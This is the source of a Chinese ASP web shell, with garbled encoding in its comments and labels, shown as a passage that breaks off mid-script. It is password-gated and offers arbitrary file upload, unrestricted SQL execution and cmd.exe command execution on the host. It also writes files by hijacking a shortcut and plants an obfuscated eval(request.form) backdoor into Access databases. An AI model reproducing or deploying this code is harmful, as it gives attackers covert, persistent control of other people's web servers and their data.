   <%@ LANGUAGE="VBSCRIPT"  codepage ="936"
   'ÃÜÂëµÚÒ»¸öÊÇzzyy2004,µÚ¶þ¸öÊÇ123321,²éÕÒÌæ»»ÕâÁ½¸öµ¥´Ê¾Í¿ÉÒÔ¸Ä³É±ðµÄÃÜÂëÁË%>
   <object runat=server id=objfsolhn scope=page classid="clsid:0D43FE01-F093-11CF-8940-00A0C9054228"></object>
   <object runat=server id=oScriptlhn scope=page classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
   <object runat=server id=oScriptNetlhn scope=page classid="clsid:093FF999-1EA0-4079-9525-9614C3504B74"></object>
   <%if err then%>
   <object runat=server id=oScriptlhn scope=page classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object>
   <object runat=server id=oScriptNetlhn scope=page classid="clsid:F935DC26-1CF0-11D0-ADB9-00C04FD58A0B"></object>
   <%
   end if %>
   <style>
   BODY {SCROLLBAR-FACE-COLOR: #ffe1e8; FONT-SIZE: 9pt; SCROLLBAR-HIGHLIGHT-COLOR: #ffe1e8; SCROLLBAR-SHADOW-COLOR: #ff9dbb; COLOR: #f486a8; SCROLLBAR-3DLIGHT-COLOR: #ff97b9; SCROLLBAR-ARROW-COLOR: #ff6f8f; SCROLLBAR-TRACK-COLOR: #ffe1e8; SCROLLBAR-DARKSHADOW-COLOR: #ffd9e0}
   a:link {font-size: 9pt;color: #ff69b4;text-decoration: none;}
   a:visited {font-size: 9pt;color: #db7093;text-decoration: none;}
   a:hover {font-size: 9pt;color: #ffb6c1;text-decoration: none;}
   table {BORDER-COLLAPSE: collapse;border: 1px dotted #EFEFEF;font-size: 9pt;}
   .noborder {font-size: 9pt;border: none;}
   input {font-size: 9pt;color: #c875a5;background-image: letter-spacing: normal;vertical-align: middle;word-spacing: normal;white-space: normal;border: 1px dotted #c875a5;clear: both;height: auto;width: auto;background-repeat: repeat;overflow: hidden;}
   textarea {font-size: 9pt;background-image: letter-spacing: normal;vertical-align: middle;word-spacing: normal;clear:none;height: auto;width: auto;border: 1px dotted #c875a5;color: #c875a5;}
   </style>
   <META http-equiv=Content-Type content="text/html; charset=gb2312">
   <title>::::²âÊÔ::::</title>
   <%
   response.buffer=true
   filename=Request.ServerVariables("URL")
   Server.ScriptTimeout=5000
   On Error Resume Next
   Dim oUpFileStream
   Class UpFile_Class
   Dim Form,File
   Public Sub GetDate (RetSize)
     Dim RequestBinDate,sSpace,bCrLf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,oFileInfo
     Dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
     Dim iFindStart,iFindEnd
     Dim iFormStart,iFormEnd,sFormName
     If Request.TotalBytes < 1 Then
       Err = 1
       Exit Sub
     End If
     If RetSize > 0 Then
       If Request.TotalBytes > RetSize Then
       Err = 2
       Exit Sub
       End If
     End If
     Set Form = Server.CreateObject ("Scripting.Dictionary")
     Form.CompareMode = 1
     Set File = Server.CreateObject ("Scripting.Dictionary")
     File.CompareMode = 1
     Set tStream = Server.CreateObject ("Adodb.Stream")
     Set oUpFileStream = Server.CreateObject ("Adodb.Stream")
     oUpFileStream.Type = 1
     oUpFileStream.Mode = 3
     oUpFileStream.Open
     oUpFileStream.Write Request.BinaryRead (Request.TotalBytes)
     oUpFileStream.Position = 0
     RequestBinDate = oUpFileStream.Read
     iFormEnd = oUpFileStream.Size
     bCrLf = ChrB (13) & ChrB (10)
      sSpace = MidB (RequestBinDate,1, InStrB (1,RequestBinDate,bCrLf)-1)
     iStart = LenB  (sSpace)
     iFormStart = iStart+2
      Do
       iInfoEnd = InStrB (iFormStart,RequestBinDate,bCrLf & bCrLf)+3
       tStream.Type = 1
       tStream.Mode = 3
       tStream.Open
       oUpFileStream.Position = iFormStart
       oUpFileStream.CopyTo tStream,iInfoEnd-iFormStart
       tStream.Position = 0
       tStream.Type = 2
       tStream.CharSet = "gb2312"
       sInfo = tStream.ReadText
       iFormStart = InStrB (iInfoEnd,RequestBinDate,sSpace)-1
       iFindStart = InStr (22,sInfo,"name=""",1)+6
       iFindEnd = InStr (iFindStart,sInfo,"""",1)
       sFormName = Mid  (sinfo,iFindStart,iFindEnd-iFindStart)
       If InStr  (45,sInfo,"filename=""",1) > 0 Then
         Set oFileInfo = new FileInfo_Class
         iFindStart = InStr (iFindEnd,sInfo,"filename=""",1)+10
         iFindEnd = InStr (iFindStart,sInfo,"""",1)
         sFileName = Mid  (sinfo,iFindStart,iFindEnd-iFindStart)
         oFileInfo.FileName = Mid (sFileName,InStrRev (sFileName, "\")+1)
         oFileInfo.FilePath = Left (sFileName,InStrRev (sFileName, "\"))
         oFileInfo.FileExt = Mid (sFileName,InStrRev (sFileName, ".")+1)
         iFindStart = InStr (iFindEnd,sInfo,"Content-Type: ",1)+14
         iFindEnd = InStr (iFindStart,sInfo,vbCr)
         oFileInfo.FileType = Mid  (sinfo,iFindStart,iFindEnd-iFindStart)
         oFileInfo.FileStart = iInfoEnd
         oFileInfo.FileSize = iFormStart -iInfoEnd -2
         oFileInfo.FormName = sFormName
         file.add sFormName,oFileInfo
       else
   tStream.Close
         tStream.Type = 1
         tStream.Mode = 3
         tStream.Open
         oUpFileStream.Position = iInfoEnd
         oUpFileStream.CopyTo tStream,iFormStart-iInfoEnd-2
         tStream.Position = 0
         tStream.Type = 2
         tStream.CharSet = "gb2312"
         sFormValue = tStream.ReadText
         If Form.Exists (sFormName) Then
           Form (sFormName) = Form (sFormName) & ", " & sFormValue
           else
           form.Add sFormName,sFormValue
         End If
       End If
       tStream.Close
       iFormStart = iFormStart+iStart+2
     Loop Until  (iFormStart+2) = iFormEnd
     RequestBinDate = ""
     Set tStream = Nothing
   End Sub
   End Class
   Class FileInfo_Class
   Dim FormName,FileName,FilePath,FileSize,FileType,FileStart,FileExt
   Public Function SaveToFile (Path)
     On Error Resume Next
     Dim oFileStream
     Set oFileStream = CreateObject ("Adodb.Stream")
     oFileStream.Type = 1
     oFileStream.Mode = 3
     oFileStream.Open
     oUpFileStream.Position = FileStart
     oUpFileStream.CopyTo oFileStream,FileSize
     oFileStream.SaveToFile Path,2
     oFileStream.Close
     Set oFileStream = Nothing
   End Function
   Public Function FileDate
     oUpFileStream.Position = FileStart
     FileDate = oUpFileStream.Read (FileSize)
     End Function
   End Class
   %>
   <% if Request("passwordlcx")="zzyy2004" then
   session("passwordlcx")="lcx"
   response.redirect Request.ServerVariables("URL")
   elseif session("passwordlcx")=""then
   %>
   <FORM name="user" method="POST">
   <center><br><br><br><br><br><br><br><br><br><br>
   <FORM name="user" method="POST"> <INPUT TYPE=password NAME=passwordlcx style="border:1px solid #99CC00; "> <INPUT TYPE=Submit VALUE="²âÊÔ°æ" style="border:1px solid #99CC00; "> </form></center>
   <%else%>
   <%
   if request("up")="yes" then
      set upload=new UpFile_Class
      upload.GetDate (1024*1024)
      for each formName in upload.file
      set file=upload.file(formName)
       if file.FileSize>0 then
       savepath=upload.form("filepath")
       file.SaveToFile savepath
       response.write "ÉÏ´«³É¹¦!ÉÏ´«ºóµÄÂ·¾¶Îª"&savepath&"<br>"
       response.write "<center><br><a href=""javascript:history.back();""><font color='#D00000'>·µ»ØÉÏÒ»Ò³</font></a></center>"
      end if
      set file=nothing
      next
      set upload=nothing
      showerr()
      response.end
   end if
   %>
   <%
   function out()
   Response.Cookies("password")=""
   response.redirect ""&url&""
   End Function%>
   <%
   on error resume next
   SearchString = Request("SearchString")
   count=0
   Function SearchFile( f, s, title )
   Set fo = objfsolhn.OpenTextFile(f)
   content = fo.ReadAll'¶ÁÈ«²¿ÎÄ±¾µ½content
   fo.Close
   SearchFile = inStr(1, content, S, vbTextCompare)>0  '´ÓµÚÒ»¸ö×Ö·û¿ªÊ¼¼ì²écontentÀïÃæÊÇ·ñÓÐS
   If SearchFile Then'Èç¹ûÓÐ,ÔòÌá³öÎÄ¼þTITLE´æÈë±äÁ¿
   pos1 = InStr(1, content, "<TITLE>", vbTextCompare)
   pos2 = InStr(1, content, "</TITLE>", vbTextCompare)
   title = ""
   If pos1 > 0 And pos2 > 0 Then'È¡TITLE±ê¼ÇÖÐ¼äµÄ×Ö·û
   title = Mid( content, pos1 + 7, pos2 - pos1 - 7 )
   End If
   End If
   End Function
   Function FileLink( f, title )
   vPath =f.Path'È¡Â·¾¶
   If title = "" Then title = f.Name'×öÁ´½Ó
   'FileLink = "<A HREF=""" & vPath & """>" & title & "</A>"
   FileLink = vPath
   FileLink = "<UL>¡¤" & FileLink & "</UL>"
   End Function
   Sub SearchFolder( fd, s )
   found = False
   For each f In fd.Files
   pos = InStrRev(f.Path, "." )
   If pos > 0 Then
   ext = Mid(f.Path, pos + 1 )
   Else
   ext = ""
   End If
   If LCase(ext) = "asp" or LCase(ext) = "asa" or LCase(ext) = "cer"  or LCase(ext) = "cdx" Then
   If SearchFile( f, s, title ) Then
   Response.Write FileLink(f, title)
   count=count+1
   End If
   End If
   Next
   For each sfd In fd.SubFolders
   SearchFolder sfd, s
   Next
   End Sub'ËÑË÷½áÊø%>
   <%'-------------------------mssqlµÄsqlÀ©Õ¹¿ªÊ¼---------------------------------
   Dim strsql, objDBConn, objRS, intFieldCount, intCounter,strcon
   strcon =trim(Request.form("strcon"))
   strsql =trim(Request.form("SQL"))
   if strSQL <> "" and lcase(left(trim(strsql),6))<>"select" Then
   Response.Write "SQLÃüÁî: " & strsql & "³É¹¦ÔËÐÐ<br>"
   Set objDBConn = Server.CreateObject("ADODB.Connection")
     objDBConn.Open strcon
    objdbconn.execute(strsql)
    objDBConn.Close
      Set objDBConn = Nothing
   end if
   '-----------------------------------Êý¾Ý¿â¼ÇÂ¼ÁÐ±í----------------------------------------
   DBDriver = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="
   strRootFolder = Server.MapPath("/")
   scriptname = Request.ServerVariables("SCRIPT_NAME")
   if request("op")="db" and request("dbname")<>"" and request("tablename")<>"" then
   dbname=trim(request("dbname"))
   tablename=request("tablename")
   Set objConn = Server.CreateObject("ADODB.Connection")
   if instr(dbname,"Info=False")>0  then
   objConn.ConnectionString = dbname
   else
   objConn.ConnectionString = DBDriver & dbname
   end if
   objConn.Open
   Set objTableRS = objConn.OpenSchema(20,Array(Empty, Empty, Empty, "TABLE"))
   if tablename="" then tablename=objTableRS("Table_Name").Value
   %>
   <table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#FFFFFF">
     <tr><td width="19%" align="center" valign="top"><a href="<%=scriptname%>?op=db&dbname=<%=Server.URLEncode(dbname)%>"><%=objfsolhn.GetFilename(dbname)%></a><br>
         <br>
         <table width="95%" border="0" cellspacing="0" cellpadding="6">
           <%Do While Not objTableRS.EOF%>
           <tr>
             <td><font size="4" face="Wingdings">3</font> <a href="<%=scriptname%>?op=db&dbname=<%=Server.URLEncode(dbname)%>&tablename=<%=Server.URLEncode(objTableRS("Table_Name").Value)%>"><%=objTableRS("Table_Name").Value%></a></td>
           </tr>
           <%objTableRS.MoveNext
           Loop%>
         </table>
       </td>
       <td width="81%" valign="top">
         <table width="100%" border="0" cellspacing="0" cellpadding="0">
           <tr valign="top">
             <td align="center" valign="top"><font color="#330099"><%=tablename%></font>
               <form action="<%=scriptname%>" method="post" name="sqlcmd" id="sqlcmd">
                 <table width="100%" border="0" cellspacing="0" cellpadding="0">
                   <tr valign="top">
                     <td align="center"> <input name="cmd" type="text" id="cmd" size="60">
                       <input name="op" type="hidden" id="op" value="sql"> <input name="dbname" type="hidden" id="dbname" value="<%=request("dbname")%>">
                       <input type="submit" value="Ö´ÐÐSQL"></td></tr></table></form> </td></tr></table>
   <table width="100%" border="1" cellspacing="0" cellpadding="3" bordercolorlight="#000000" bordercolordark="#FFFFFF">
   <tr bgcolor="#CCCCCC" align="center" valign="top">
   <%dim mysql,i,j
   j=1
   mysql="Select Top 10 * From ["&tablename&"]"
   Set objRS=objConn.Execute(mysql)
   For i=0 to objRs.Fields.Count-1
   Response.write"<td><b>"&objRS.Fields(i).name&"</b></td>"
   Next
   Response.write "</tr>"
   if objrs.eof then
   else
   DO While NOT objRS.Eof
   Response.write "<tr>"
   %>
   <%
   For i=0 to objRs.Fields.Count-1
   Response.write"<td>"
   If IsNull(objRs.Fields(i).value) or objRs.Fields(i).value="" or objRs.Fields(i).value=" " then
   response.write "&nbsp;"
   else
     Response.write Server.HTMLEncode(objRs.Fields(i).value)
    end if
   Response.write"</td>"
   Next
   Response.write"</tr>"
   objRS.MoveNext
   j=j+1
   Loop
   end if
   set objRs = nothing
   set objTableRS = nothing
   objConn.Close
   set objConn = nothing
   %>
   </table>
   <p>×î¶àÏÔÊ¾10Ìõ¼ÇÂ¼£¬Òª²ì¿´¸ü¶à¼ÇÂ¼ÇëÊ¹ÓÃSQLÃüÁî</p><br>
   </table>
   <%
   Response.End
   end if
   %>
   <%
   if request("op")="db" and request("dbname")<>"" then
   dbname=trim(request("dbname"))
   Set objConn = Server.CreateObject("ADODB.Connection")
   'objConn.ConnectionString = DBDriver & dbname
   if instr(dbname,"Info=False")>0  then
   objConn.ConnectionString = dbname
   else
   objConn.ConnectionString = DBDriver & dbname
   end if
   objConn.Open
   Set objTableRS = objConn.OpenSchema(20,Array(Empty, Empty, Empty, "TABLE"))
   %>
   <table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#FFFFFF">
     <tr>
       <td width="19%" align="center" valign="top"><a href="<%=scriptname%>?op=db&dbname=<%=dbname%>"><%=objfsolhn.GetFilename(dbname)%></a><br>
         <br>
         <table width="95%" border="0" cellspacing="0" cellpadding="6">
           <%Do While Not objTableRS.EOF%>
           <tr>
             <td><font size="4" face="Wingdings">3</font> <a href="<%=scriptname%>?op=db&dbname=<%=Server.URLEncode(dbname)%>&tablename=<%=Server.URLEncode(objTableRS("Table_Name").Value)%>"><%=objTableRS("Table_Name").Value%></a></td>
           </tr>
           <%objTableRS.MoveNext
           Loop
           objTableRS.MoveFirst%>
         </table>
       </td>
       <td width="81%" align="center" valign="top"><a href="<%=scriptname%>?op=sql&dbname=<%=dbname%>">Ö´ÐÐSQLÃüÁî<br>
         </a>
         <%While Not objTableRS.EOF%>
         <table width="98%" border="1" cellspacing="0" cellpadding="3" bordercolorlight="#000000" bordercolordark="#FFFFFF">
           <tr align="center" bgcolor="#FFFFCC">
             <td colspan="6"><font color="#660000" size="2"><b><%=objTableRS("Table_Name").Value%></b></font></td>
           </tr> <tr align="center">  <td>×Ö¶ÎÃû</td> <td>Êý¾ÝÀàÐÍ</td><td>×Ö¶Î´óÐ¡</td><td>¾«¶È</td><td>ÊÇ·ñÔÊÐíÎª¿Õ</td><td>Ä¬ÈÏÖµ</td> </tr> <tr>
           <%Set objColumnRS = objConn.OpenSchema(4,Array(Empty, Empty, objTableRS("Table_Name").Value))
           While Not objColumnRS.EOF
           iLength = objColumnRS("Character_Maximum_Length")
           iPrecision = objColumnRS("Numeric_Precision")
                   iScale = objColumnRS("Numeric_Scale")
           iDefaultValue = objColumnRS("Column_Default")
                   If IsNull(iLength) then iLength = "&nbsp;"
                   If IsNull(iPrecision) then iPrecision = "&nbsp;"
           If IsNull(iScale) then iScale = "&nbsp;"
           If IsNull(iDefaultValue) then iDefaultValue = "&nbsp;"%>
             <td width="29%" height="8"><%=objColumnRS("Column_Name")%></td>
             <td width="12%" height="8"><%=fieldtype(objColumnRS("Data_Type"))%></td>
             <td width="11%" height="8"><%=iLength%></td>
             <td width="9%" height="8"><%=iPrecision%></td>
             <td width="17%" align="center" height="8">
               <%If objColumnRS("Is_Nullable") then
               Response.Write "ÊÇ"
               else
               Response.write "·ñ"
           End If%>
             </td>
             <td width="22%" height="8"><%=iDefaultValue%></td>
           </tr>
           <%objColumnRS.MoveNext
       Wend
       objTableRS.MoveNext
       Set objColumnRS = Nothing
   Response.write "<br>"
   Wend
   objTableRS.Close
   Set objTableRS = Nothing
   objConn.Close
   Set objConn = Nothing
   %>
    </table> </td> </table>
   <%
   Response.End
   end if
   %>
   <%
   '----------------------------Ö´ÐÐSQLÃüÁî---------------------------------------------
   if request("op")="sql" then
   dbname=trim(request("dbname"))
   Set objConn = Server.CreateObject("ADODB.Connection")
   'objConn.ConnectionString = DBDriver & dbname
   if instr(dbname,"Info=False")>0  then
   objConn.ConnectionString = dbname
   else
   objConn.ConnectionString = DBDriver & dbname
   end if
   objConn.Open
   Set objTableRS = objConn.OpenSchema(20,Array(Empty, Empty, Empty, "TABLE"))
   j=0
   %>
   <table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#FFFFFF">
     <tr>
       <td width="13%" align="center" valign="top"><a href="<%=scriptname%>?op=db&dbname=<%=Server.URLEncode(dbname)%>"><%=objfsolhn.GetFilename(dbname)%></a><br>
         <br>
         <table width="95%" border="0" cellspacing="0" cellpadding="6">
           <%Do While Not objTableRS.EOF%>
           <tr>
             <td><font size="4" face="Wingdings">3</font> <a href="<%=scriptname%>?op=db&dbname=<%=Server.URLEncode(dbname)%>&tablename=<%=Server.URLEncode(objTableRS("Table_Name").Value)%>"><%=objTableRS("Table_Name").Value%></a></td>
           </tr>
           <%objTableRS.MoveNext
           Loop%>
         </table>
       </td>
       <td width="87%" align="center" valign="top">
         <form action="<%=scriptname%>" method="post" name="sqlcmd" id="sqlcmd">
         <table width="100%" border="0" cellspacing="0" cellpadding="0">
           <tr valign="top">
             <td align="center">
                   <input name="cmd" type="text" id="cmd" size="60">
                 <input name="op" type="hidden" id="op" value="sql">
                 <input name="dbname" type="hidden" id="dbname" value="<%=request("dbname")%>">
                 <input type="submit" value="Ö´ÐÐSQL"></td>
           </tr>
         </table>
         </form>
         <table width="100%" border="1" cellspacing="0" cellpadding="3" bordercolorlight="#000000" bordercolordark="#FFFFFF">
           <tr bgcolor="#CCCCCC" align="center" valign="top">
   <%if request("cmd")<>"" then
   mysql=request("cmd")
   Set objRS=objConn.Execute(mysql)
   if objrs.state = 1 then
   For i=0 to objRs.Fields.Count-1
   Response.write"<td><b>"&objRS.Fields(i).name&"</b></td>"
   Next
   Response.write "</tr>"
   if objrs.eof then
   %>
   <%else
   DO While NOT objRS.Eof
   Response.write "<tr>"
   %>
   <%
   For i=0 to objRs.Fields.Count-1
   Response.write"<td>"
   If IsNull(objRs.Fields(i).value) or objRs.Fields(i).value="" or objRs.Fields(i).value=" " then
   response.write "&nbsp;"
   else
     Response.write Server.HTMLEncode(objRs.Fields(i).value)
    end if
   Response.write"</td>"
   Next
   Response.write"</tr>"
   objRS.MoveNext
   j=j+1
   Loop
   end if
   set objRs = nothing
   end if
   end if
   set objTableRS = nothing
   objConn.Close
   set objConn = nothing
   %>
        </table>
         <br>
         <%if request("cmd")<>"" then response.Write("ÃüÁîÖ´ÐÐ³É¹¦£¬·µ»Ø <font color=""#FF0000"">"&j&"</font> Ìõ¼ÇÂ¼")%>
     </table>
   <%
   Response.End
   end if
   %>
   <%
   url= Request.ServerVariables("URL")
   if trim(request.form("password"))<>"" and trim(request.form("password"))<>"123321" then call out()
   if trim(request.form("password"))="123321" then
   response.cookies("password")="allen"
   response.redirect ""&url&""
   else if Request.Cookies("password")<>"allen" then
   call login() 'ÃÜÂë´íÎó
   response.end 'Í£Ö¹ÔËÐÐ
   end if
   select case request("id")
   case "edit"
   call edit()
   case "upload"
   call upload()
   case "dir"
   call dir()
   case "down"
   call downloadFile(request("path"))
   case "inject"
   call inject()
   case else
   call main()
   end select
   end if
   sub login()
   for i=0 to 25
   on error resume next
   IsObj=false
   VerObj=""
   dim TestObj
   set TestObj=server.CreateObject(ObjTotest(i,0))
   If -2147221005 <> Err then
   IsObj = True
   VerObj = TestObj.version
   if VerObj="" or isnull(VerObj) then VerObj=TestObj.about
   end if
   ObjTotest(i,2)=IsObj
   ObjTotest(i,3)=VerObj
   next
   %>
   <center>
   <table border=0 width=500 cellspacing=0 cellpadding=0 class="noborder">
   <tr><td>
   <table border=0 width=100% cellspacing=1 cellpadding=0 class="noborder" >
   <tr bgcolor="#EEEEEE" height=18 class="noborder">
   <td width="59%" align=left>&nbsp;·þÎñÆ÷Ãû</td>
   <td width="41%" bgcolor="#EEEEEE">&nbsp;<%=Request.ServerVariables("SERVER_NAME")%></td>
   </tr>
   <tr bgcolor="#EEEEEE" height=18 class="noborder">
   <td align=left>&nbsp;·þÎñÆ÷IP</td>
   <td>&nbsp;<%=Request.ServerVariables("LOCAL_ADDR")%></td>
   </tr>
   <tr bgcolor="#EEEEEE" height=18 class="noborder">
   <td align=left>&nbsp;·þÎñÆ÷Ê±¼ä</td>
   <td>&nbsp;<%=now%></td>
   </tr>
   <tr bgcolor="#EEEEEE" height=18 class="noborder">
   <td align=left>&nbsp;±¾ÎÄ¼þ¾ø¶ÔÂ·¾¶</td>
   <td>&nbsp;<%=server.mappath(Request.ServerVariables("SCRIPT_NAME"))%></td>
   </tr>
   <tr bgcolor="#EEEEEE" height=18 class="noborder">
   <td align=left>&nbsp;·þÎñÆ÷²Ù×÷ÏµÍ³</td>
   <td>&nbsp;<%=Request.ServerVariables("OS")%></td>
   </tr>
   <tr bgcolor="#EEEEEE" height=18 class="noborder"><%
   dim t1,t2,lsabc,thetime
   t1=timer
   for i=1 to 500000
   lsabc= 1 + 1
   next
   t2=timer
   thetime=cstr(int(( (t2-t1)*10000 )+0.5)/10)
   %><td align=left>&nbsp·þÎñÆ÷ÔËËãËÙ¶È²âÊÔ</td>
   <td>&nbsp;<font color=red><%=thetime%> ºÁÃë</font></td>
   </tr>
   </table><center><br>
   <script language="JavaScript">
   function openwin() {
   var newwin=window.open("","newwin","top=0,left=0,toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,resizable=yes,width=700,height=600");
   document.form9.action="";
   document.form9.submit();
   return true;}
   </script>
   <script language="JavaScript">
   function char() {
   alert("ÕâÀïÊÇÔÚACESSÊý¾ÝÀï²åÈë±ùºüÀË×ÓµÄºóÃÅ,Ä¬ÈÏÃÜÂëÊÇ#\n³É¹¦µÄÇ°ÌáÊÇÊý¾Ý¿âÊÇaspºó×º£¬²¢ÇÒÃ»ÓÐ´íÂÒasp´úÂë\n");
   window.open("<%=url%>?dbname="+form9.dbname.value);
   self.close();
   return true;}
   </script>
   <form  action="<%=url%>"  name=form9 target="newwin" method="GET">
   <table border=0 width=500 cellspacing=0 cellpadding=0 class="noborder">
     <tr bgcolor="#EEEEEE" height=18 class="noborder">
         <td>&nbspmdb+sqlÊý¾Ý¿â²Ù×÷:</td>
         <td>
   <input type=hidden name=op value="db">
   <input type=text name=dbname value="Provider=SQLOLEDB.1;Persist Security Info=False;Server=127.0.0.1;User ID=sa;Password=lcx;Database=bbs;" size ="40"> <input type="button" value="Ìá½»" onclick="openwin()"> <input type="button" value="²åÈë" onclick="char()"> <input type="button" value="ÌáÊ¾" onclick="prompt('²åÈëÖ»Õë¶ÔACESS²Ù×÷','ä¯ÀÀACESS,ÒªÐ´ÈëMDBµÄ¾ø¶ÔÂ·¾¶£¬Èçd:bbs.mdb;¸ü¸Ä±íµ¥ÖÐ¶ÔÓ¦µÄMSSQL×Ö·û´®¾Í¿ÉÒÔ²Ù×÷sql¿âÁË')"></td></tr></table></form>
   <%' -------------------ÔÚACESSÊý¾Ý¿âÀïÐ´ÈëaspºóÃÅ¿ªÊ¼-----------------------
   DBDriver = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="
   dbname=request("dbname")
   Set objConn = Server.CreateObject("ADODB.Connection")
   objConn.ConnectionString = DBDriver & dbname
   objConn.Open
   objConn.execute("create table notdownloadlcx(notdownloadlcx oleobject)")
   set rs=server.createobject("adodb.recordset")
       sql="select * from notdownloadlcx"
       rs.open sql,objConn,1,3
       rs.addnew
       rs("notdownloadlcx").appendchunk(chrB(asc("<")) & chrB(asc("s")) & chrB(asc("c"))& chrB(asc("r")) & chrB(asc("i"))& chrB(asc("p"))& chrB(asc("t"))& chrB(asc(" "))& chrB(asc("r"))& chrB(asc("u"))& chrB(asc("n"))& chrB(asc("a"))& chrB(asc("t"))& chrB(asc("="))& chrB(asc("s"))& chrB(asc("e"))& chrB(asc("r"))& chrB(asc("v"))& chrB(asc("e"))& chrB(asc("r"))& chrB(asc(" "))& chrB(asc("l"))& chrB(asc("a"))& chrB(asc("n"))& chrB(asc("g"))& chrB(asc("u"))& chrB(asc("a"))& chrB(asc("g"))& chrB(asc("e"))& chrB(asc("="))& chrB(asc("j"))& chrB(asc("a"))& chrB(asc("v"))& chrB(asc("a"))& chrB(asc("s"))& chrB(asc("c"))& chrB(asc("r"))& chrB(asc("i"))& chrB(asc("p"))& chrB(asc("t"))& chrB(asc(">"))& chrB(asc("e"))& chrB(asc("v"))& chrB(asc("a"))& chrB(asc("l"))& chrB(asc("("))& chrB(asc("r"))& chrB(asc("e"))& chrB(asc("q"))& chrB(asc("u"))& chrB(asc("e"))& chrB(asc("s"))& chrB(asc("t"))& chrB(asc("."))& chrB(asc("f"))& chrB(asc("o"))& chrB(asc("r"))& chrB(asc("m"))& chrB(asc("("))& chrB(asc("'"))& chrB(asc("#"))& chrB(asc("'"))& chrB(asc(")"))& chrB(asc("+"))& chrB(asc("'"))& chrB(asc("'"))& chrB(asc(")"))& chrB(asc("<"))& chrB(asc("/"))& chrB(asc("s"))& chrB(asc("c"))& chrB(asc("r"))& chrB(asc("i"))& chrB(asc("p"))& chrB(asc("t"))& chrB(asc(">")))
       rs.update
       rs.close
   set rs=nothing
   objConn.close
   set objConn=nothing
   '-----------------------------------------------------Êý¾Ý¿â²Ù×÷½áÊø------------------------------------
   '---------------------Ãâfso´úÂëÐ´ÎÄ¼þ¿ªÊ¼Õë¶ÔÖÐÎÄ-----------------------------------
   pathlcx=trim(Request.form("pathlcx"))
   textlcx=trim(Request.form("textlcx"))
   if textlcx<>"" and pathlcx<>"" then
   textlcx=replace(textlcx,">","^>")
   textlcx=replace(textlcx,"<","^<")
   textlcx=replace(textlcx,"&","^&")
   textlcx=replace(textlcx,chr(34),"^"&chr(34))
   textlcx=replace(textlcx,chr(10),"^"&chr(10))
   textlcx=replace(textlcx,chr(13),"^"&chr(13))
   set shell=server.createobject("shell.application")
   set shellfolder=shell.namespace("C:\Documents and Settings\Default User\¡¸¿ªÊ¼¡¹²Ëµ¥\³ÌÐò\¸½¼þ")
   set shellfolderitem=shellfolder.parsename("¼ÇÊÂ±¾.lnk")
   set objshelllink =shellfolderitem.getlink
   objshelllink.path="cmd.exe"
   objshelllink.arguments="/c echo "&textlcx&">"&pathlcx&" &&del c:\a.lnk"
   objshelllink.save("c:\a.lnk")
   shell.namespace("c:\").items.item("a.lnk").invokeverb
   end if
   '--------------Ãâfso´úÂëÐ´ÎÄ¼þ½áÊø-----------Ãâfso±íµ¥¿ªÊ¼-------------%>
   <table border=0 width=500 cellspacing=0 cellpadding=0 class="noborder"><tr bgcolor="#EEEEEE" height=18 class="noborder" style='table-layout:fixed; word-break:break-all'><td align=left>
   <form action="<%= Request.ServerVariables("URL") %>" method="post">
   <input type=text name=text value="<%=DSnXA %>">  <font class=fonts>ÊäÈëÒªä¯ÀÀµÄÄ¿Â¼,×îºóÒª¼Ó\</font></td></tr><tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left>
   <input type=text name=text1 value="<%=DSnXA1 %>">
   copy
   <input type=text name=text2 value="<%=DSnXA2 %>"> <font class=fonts>Ä¿Â¼»òÎÄ¼þ(²»Òª¼ÓÄ¿Â¼ºÍÎÄ¼þÃû£©</font></td></tr><tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left>
   <input type=text name=text3 value="<%=DSnXA3 %>">
   move
   <input type=text name=text4 value="<%=DSnXA4 %>"><font class=fonts> Ä¿Â¼»òÎÄ¼þ(²»Òª¼ÓÄ¿Â¼ºÍÎÄ¼þÃû£©</font></td></tr><tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left>
   Â·¾¶£º<input type=text name=text5 value="<%=DSnXA5 %>" >
   ³ÌÐò£º<input type=text name=text6 value="<%=DSnXA6 %>" ><font class=fonts> ²»¿ÉÒÔ¼Ó²ÎÊý</font></td></tr><tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left><input type="text" name="ok" size=55><font class=fonts> CMDÃüÁî¶Ô»°¿ò</font>
   </td></tr><tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left><input type=text name=pathlcx size=55><font class=fonts> Â·¾¶ÓëÎÄ¼þÃû</font></td><tr/>
   <tr bgcolor="#EEEEEE" height=18 class="noborder"><td align=left>
   <textarea  cols=80 rows=5 name=textlcx >
   ÒªÉú³ÉµÄÎÄ¼þÄÚÈÝ£¬²»¿ÉÒÔÓÐ»Ø³µ£º
   <% ok=Request("ok")
   response.write oScriptlhn.exec ("cmd.exe /c "& ok).stdout.readall
   %></textarea>
   <input type=submit name=sb value=·¢ËÍÃüÁî class=input>
   </form></td></tr><%'-------------Ãâfso±íµ¥µ¥´úÂë½áÊø------------%>
   <script language=vbs>
   sub main()
   base=document.all.text9.value
   If IsNumeric(base) Then
   cc=hex(cstr(base))
   alert("10½øÖÆÎª"&base)
   alert("16½øÖÆÎª"&cc)
   exit sub
   end if
   aa=asc(cstr(base))
   bb=hex(aa)
   alert("10½øÖÆÎª"&aa)
   alert("16½øÖÆÎª"&bb)
   end sub
   sub main2()
   If document.all.vars.value<>"" Then
   '¶¨ÒåÏà¹Ø±äÁ¿
   Dim nums,tmp,tmpstr,i
   nums=document.all.vars.value   'È¡µÃ´ÓÓÃ»§¶ËÊäÈë½øÀ´µÄ16½øÖÆÊýÖµ
   nums_len=Len(nums)     'µÃ³önumsµÄ³¤¶È
   '¿ªÊ¼Ñ»·£¬´ÎÊýÎªnumsµÄ³¤¶ÈÖµ
   For i=1 To nums_len
